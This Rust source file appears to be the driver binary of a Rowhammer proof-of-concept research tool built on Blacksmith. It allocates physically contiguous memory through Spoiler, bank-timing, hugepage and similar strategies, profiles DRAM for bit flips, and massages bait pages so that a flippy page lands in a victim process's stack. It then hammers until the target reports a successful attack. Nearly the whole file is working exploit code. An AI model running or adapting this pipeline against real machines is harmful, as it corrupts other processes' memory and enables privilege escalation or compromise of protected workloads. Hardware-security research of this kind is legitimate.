use std::{
    collections::HashMap,
    fmt::Debug,
    fs::File,
    io::{stdin, BufReader, BufWriter, Write},
    ops::Range,
    time::Duration,
};

use anyhow::bail;
use bs_poc::{
    allocator::hugepage::HugepageAllocator,
    hammerer::{make_hammer, HammerStrategy},
    memory::{BitFlip, DataPattern, Initializable, VictimMemory},
    util::PAGE_SHIFT,
    victim::{stack_process::find_flippy_page, HammerVictimError},
};
use bs_poc::{
    allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
    memory::ConsecCheck,
    victim,
};
use bs_poc::{
    allocator::{CoCo, HugepageRandomized, Spoiler},
    hammerer::Hammerer,
};
use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
use bs_poc::{
    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
    memory::PfnResolver,
};
use bs_poc::{hammerer::Hammering, victim::stack_process::InjectionConfig};
use bs_poc::{
    memory::{mem_configuration::MemConfiguration, GetConsecPfns},
    util::PAGE_SIZE,
};
use bs_poc::{
    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
    retry,
    util::init_logging_with_progress,
};
use clap::Parser;
use indicatif::{MultiProgress, ProgressBar};
use itertools::Itertools;
use log::{info, warn};
use rand::{rngs::StdRng, SeedableRng};
use serde::Serialize;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load.
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the `blacksmith` JSON file.
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// The allocation strategy to use.
    #[clap(long = "alloc-strategy", default_value = "spoiler")]
    alloc_strategy: AllocStrategy,
    /// The hammering strategy to use.
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "10")]
    profiling_rounds: u64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 100 is a good starting point for the blacksmith hammerer.
    #[arg(long, default_value = "100")]
    attempts: u8,
    /// Do a stats run. This will run the hammerer and store the results in the provided file. The default is `None`, causing no stats to be stored.
    /// When `stats` is set, the hammering process will not exit after the first successful attack, but continue hammering until `repeat` is reached.
    #[arg(long)]
    statistics: Option<String>,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    target: Vec<String>,
}

/// The type of allocation strategy to use.
#[derive(clap::ValueEnum, Clone, Debug)]
pub enum AllocStrategy {
    /// Use `/proc/buddyinfo` to monitor availability of page orders, assume consecutive memory according to the delta in buddyinfo.
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    /// Allocate consecutive memory using huge pages.
    Hugepage,
    /// Allocate consecutive memory using huge pages with randomization. This will return random 4 MB chunks of a 1 GB hugepage.
    HugepageRnd,
    /// Allocate consecutive memory using `bank timing`. This will `mmap` a large buffer and find consecutive memory using bank timing check
    BankTiming,
    /// Allocate a large block of memory and use pagemap to find consecutive blocks
    Pfn,
    /// Allocate consecutive memory using the Spoiler attack. This strategy will measure read-after-write pipeline conflicts to determine consecutive memory.
    Spoiler,
}

impl AllocStrategy {
    fn create_allocator(
        &self,
        mem_config: MemConfiguration,
        conflict_threshold: u64,
        progress: Option<MultiProgress>,
    ) -> allocator::ConsecAlloc {
        match self {
            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
            )),
            AllocStrategy::CoCo => ConsecAlloc::CoCo(CoCo {}),
            AllocStrategy::BankTiming => ConsecAlloc::Mmap(Mmap::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
                progress,
            )),
            AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
            AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
            AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::default()),
            AllocStrategy::Spoiler => ConsecAlloc::Spoiler(Box::new(Spoiler::new(
                mem_config,
                conflict_threshold,
                progress,
            ))),
        }
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);
    Ok(LoadedPattern { pattern, mapping })
}

#[derive(Debug)]
struct RoundProfile {
    bit_flips: Vec<BitFlip>,
    pattern: DataPattern,
    duration: Duration,
}
#[derive(Debug)]
struct Profiling {
    rounds: Vec<RoundProfile>,
}

/// Hammer a given memory region a number of times to profile for vulnerable addresses.
fn hammer_profile(
    hammerer: &Hammerer,
    memory: &ConsecBlocks,
    num_rounds: u64,
    progress: Option<MultiProgress>,
) -> Profiling {
    let p = progress
        .as_ref()
        .map(|p| p.add(ProgressBar::new(num_rounds * 3)));
    let mut rounds = vec![];

    for pattern in [
        //DataPattern::StripeZero(aggressors.clone()),
        //DataPattern::StripeOne(aggressors.clone()),
        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
        DataPattern::Random(Box::new(StdRng::from_seed(rand::random()))),
    ] {
        for _ in 0..num_rounds {
            if let Some(p) = p.as_ref() {
                p.inc(1)
            }
            let start = std::time::Instant::now();
            let mut victim = victim::MemCheck::new(memory, pattern.clone());
            let result = hammerer.hammer(&mut victim);
            let duration = std::time::Instant::now() - start;
            let bit_flips = match result {
                Ok(result) => {
                    info!(
                        "Profiling hammering round successful at attempt {}: {:?}",
                        result.attempt, result.victim_result
                    );
                    result.victim_result
                }
                Err(e) => {
                    warn!("Profiling hammering round not successful: {:?}", e);
                    vec![]
                }
            };
            rounds.push(RoundProfile {
                bit_flips,
                pattern: pattern.clone(),
                duration,
            });
        }
    }
    Profiling { rounds }
}

// find profile entry with bitflips in needed range
#[derive(Clone, Debug)]
struct TargetOffset {
    page_offset: usize,
    stack_offset: usize,
    target_size: usize,
}
fn filter_flips<'a>(
    bit_flips: Vec<&'a BitFlip>,
    targets: &[TargetOffset],
) -> Vec<(&'a BitFlip, usize)> {
    bit_flips
        .into_iter()
        .filter_map(|candidate| {
            let pg_offset = candidate.addr & 0xfff;
            let matched = targets.iter().find(|&target| {
                let addr = target.page_offset & 0xfff;
                addr <= pg_offset && pg_offset < addr + target.target_size
            });
            if matched.is_some() {
                info!("Matched candidate {:?} to target {:?}", candidate, matched);
            }
            matched.map(|offset| (candidate, offset.stack_offset))
        })
        .collect_vec()
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();
    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    info!("Args: {:?}", args);

    let mut alloc_strategy =
        args.alloc_strategy
            .create_allocator(mem_config, config.threshold, Some(progress.clone()));
    let block_size = alloc_strategy.block_size();

    let repetitions = match args.repeat {
        Some(Some(repeat)) => repeat,
        Some(None) => usize::MAX,
        None => 1,
    };

    #[derive(Serialize)]
    struct HammerStatistic {
        alloc_duration_millis: u128,
        memory_regions: Vec<Range<u64>>,
        hammer_durations_millis: Vec<u128>,
        bit_flips: Vec<Vec<BitFlip>>,
    }
    let mut stats = vec![];
    'repeat: for _ in 0..repetitions {
        info!("Starting bait allocation");
        let start = std::time::Instant::now();
        let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
        let alloc_duration = std::time::Instant::now() - start;
        info!("Allocated {} bytes of memory", memory.len());

        info!("Profiling memory for vulnerable addresses");
        info!(
            "Expecting bitflips at {:?}",
            pattern
                .mapping
                .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
        );
        let profile_hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.attempts,
            true,
            None,
        )?;
        let profiling = hammer_profile(
            &profile_hammer,
            &memory,
            args.profiling_rounds,
            Some(progress.clone()),
        );
        let bit_flips = profiling
            .rounds
            .iter()
            .flat_map(|r| r.bit_flips.iter())
            .collect::<Vec<_>>();
        // write stats
        if let Some(stats_file) = &args.statistics {
            stats.push(HammerStatistic {
                alloc_duration_millis: alloc_duration.as_millis(),
                memory_regions: memory.consec_pfns().unwrap_or_default(),
                hammer_durations_millis: profiling
                    .rounds
                    .iter()
                    .map(|r| r.duration.as_millis())
                    .collect(),
                bit_flips: profiling
                    .rounds
                    .iter()
                    .map(|r| r.bit_flips.clone())
                    .collect::<Vec<_>>()
                    .clone(),
            });
            info!(
                "Writing statistics to file {}",
                args.statistics.as_ref().unwrap()
            );
            let mut json_file = BufWriter::new(File::create(stats_file)?);
            serde_json::to_writer_pretty(&mut json_file, &stats)?;
            json_file.flush()?;
        }
        if bit_flips.is_empty() {
            warn!("No vulnerable addresses found");
            memory.dealloc();
            continue;
        } else {
            info!("Profiling done. Found bitflips in {:?}", bit_flips);
        }

        let targets = [
            TargetOffset {
                page_offset: 0x700,
                stack_offset: 31,
                target_size: 448,
            },
            TargetOffset {
                page_offset: 0xa10,
                stack_offset: 31,
                target_size: 256,
            },
        ];
        // the number of bait pages to release after the target page (for memory massaging)
        let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);

        // Find address to use for injection by majority vote
        let (addr, stack_offset) = match filter_flips(bit_flips, &targets).last().cloned() {
            Some((flip, offset)) => (flip.addr, offset),
            None => {
                warn!("No vulnerable addresses found");
                memory.dealloc();
                continue;
            }
        };
        /*let addr = match bit_flips.first() {
            Some(flip) => flip.addr,
            None => {
                warn!("No vulnerable addresses found");
                memory.dealloc();
                continue;
            }
        };
        let stack_offset = 31;*/
        info!(
            "Using address {:x} (phys {:x}) for injection at stack offset {}",
            addr,
            (addr as *const u8).pfn().unwrap_or_default(),
            stack_offset
        );

        // find round with flips in `addr`, get seed
        let dpattern = profiling
            .rounds
            .iter()
            .find(|r| r.bit_flips.iter().any(|b| b.addr == addr))
            .expect("no round with flips in addr")
            .pattern
            .clone();
        let success = reproduce_pattern(&profile_hammer, dpattern.clone(), &memory, 10);
        match success {
            Ok(success) => {
                info!("Reproduced pattern {} times", success);
                if success < 5 {
                    warn!("Failed to reproduce pattern at least 5 times");
                    memory.dealloc();
                    continue;
                }
            }
            Err(e) => {
                warn!("Failed to reproduce pattern: {:?}", e);
                memory.dealloc();
                continue;
            }
        }
        memory.initialize(dpattern.clone());
        let addr = addr & !0xfff; // mask out the lowest 12 bits
        let target_pfn = (addr as *const u8).pfn().expect("no pfn") >> PAGE_SHIFT;

        let victim = if args.target.is_empty() {
            None
        } else {
            // refactor me. This is way too deep.
            match victim::StackProcess::new(
                &args.target,
                InjectionConfig {
                    flippy_page: addr as *mut libc::c_void,
                    flippy_page_size: PAGE_SIZE,
                    bait_count_after: bait_count_after
                        .get(&stack_offset)
                        .copied()
                        .expect("unsupported stack offset"),
                    bait_count_before: 0,
                },
            ) {
                Ok(p) => {
                    let flippy_page = find_flippy_page(target_pfn, p.pid());
                    match flippy_page {
                        Ok(Some(flippy_page)) => {
                            info!("Flippy page found: {:?}", flippy_page);
                            if flippy_page.region_offset != stack_offset {
                                warn!(
                                    "Flippy page offset mismatch: {} != {}",
                                    flippy_page.region_offset, stack_offset
                                );
                                p.stop();
                                continue 'repeat;
                            }
                            Some(p)
                        }
                        Ok(None) => {
                            warn!("Flippy page not found");
                            p.stop();
                            continue 'repeat;
                        }
                        Err(e) => {
                            warn!("Error finding flippy page: {:?}", e);
                            p.stop();
                            continue 'repeat;
                        }
                    }
                }
                Err(e) => {
                    warn!("Failed to create victim: {:?}", e);
                    continue 'repeat;
                }
            }
        };
        match victim {
            Some(mut victim) => {
                for _ in 0..100 {
                    let hammer = make_hammer(
                        &args.hammerer,
                        &pattern.pattern,
                        &pattern.mapping,
                        mem_config,
                        block_size,
                        &memory,
                        args.attempts,
                        false,
                        Some(vec![addr as *const u8]),
                    )?;
                    let result = hammer.hammer(&mut victim);
                    match result {
                        Ok(result) => {
                            info!("Hammering successful: {:?}", result.victim_result);
                            return Ok(());
                        }
                        Err(HammerVictimError::NoFlips) => {
                            warn!("No flips detected");
                        }
                        Err(e) => {
                            warn!("Hammering failed: {:?}", e);
                            break;
                        }
                    }
                }
                victim.stop();
            }
            None => {
                warn!("No target specified.");
            }
        }
        memory.dealloc();
    }
    bail!(
        "Hammering was not successful after {} repetitions",
        repetitions
    );
}

fn reproduce_pattern<H: Hammering>(
    hammer: &H,
    pattern: DataPattern,
    memory: &dyn VictimMemory,
    rounds: usize,
) -> anyhow::Result<u8> {
    // reproduce pattern 10 times
    let mut victim = victim::MemCheck::new(memory, pattern.clone());
    let mut success = 0;
    for i in 0..rounds {
        let result = hammer.hammer(&mut victim);
        match result {
            Ok(result) => {
                if result.victim_result.is_empty() {
                    warn!("Failed to reproduce pattern in run {}: no flips", i);
                } else {
                    info!(
                        "Reproduced pattern in run {}: {:?}",
                        i, result.victim_result
                    );
                    success += 1;
                }
            }
            Err(e) => {
                warn!("Failed to reproduce pattern in run {}: {:?}", i, e);
            }
        }
    }
    Ok(success)
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}

#[test]
fn test_filter_flips_match_start() {
    let flips = [BitFlip {
        addr: 0x700,
        bitmask: 0x1,
        data: 0xff,
    }];
    let targets = [TargetOffset {
        page_offset: 0x700,
        stack_offset: 31,
        target_size: 32,
    }];
    let filtered = filter_flips(flips.iter().collect(), &targets);
    assert_eq!(filtered.len(), 1);
}

#[test]
fn test_filter_flips_match_end() {
    let flips = [BitFlip {
        addr: 0x700,
        bitmask: 0x1,
        data: 0xff,
    }];
    let target = TargetOffset {
        page_offset: 0x600,
        stack_offset: 31,
        target_size: 0x101,
    };
    let filtered = filter_flips(flips.iter().collect(), &[target]);
    assert_eq!(filtered.len(), 1);
}

#[test]
fn test_filter_flips_nomatch() {
    let flips = [BitFlip {
        addr: 0x700,
        bitmask: 0x1,
        data: 0xff,
    }];
    let target = TargetOffset {
        page_offset: 0x600,
        stack_offset: 31,
        target_size: 0x100,
    };
    let filtered = filter_flips(flips.iter().collect(), &[target]);
    assert_eq!(filtered.len(), 0);
}
